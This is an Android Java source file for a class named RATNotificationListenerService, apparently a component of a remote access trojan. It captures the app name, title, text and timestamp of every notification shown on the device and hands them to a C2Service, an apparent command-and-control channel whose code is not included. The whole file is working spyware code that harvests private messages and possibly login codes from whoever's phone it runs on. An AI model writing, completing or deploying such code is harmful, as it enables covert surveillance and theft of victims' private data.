package com.example.client;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

public class RATNotificationListenerService extends NotificationListenerService {

    private static final String TAG = "RATNotificationListenerService";

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        super.onNotificationPosted(sbn);
        try {
            JSONObject log = new JSONObject();
            log.put("type", "notification");

            JSONObject data = new JSONObject();
            data.put("package", sbn.getPackageName());
            data.put("title", sbn.getNotification().extras.getString("android.title", "N/A"));
            data.put("text", sbn.getNotification().extras.getString("android.text", "N/A"));
            data.put("timestamp", System.currentTimeMillis());

            log.put("data", data);
            C2Service.logEvent(log);

            Log.d(TAG, "Benachrichtigung von " + sbn.getPackageName() + " erfasst.");
        } catch (JSONException e) {
            Log.e(TAG, "Fehler beim Erstellen des Notification-JSON", e);
        }
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        super.onNotificationRemoved(sbn);
        // Optional: Loggen von entfernten Benachrichtigungen
    }
}
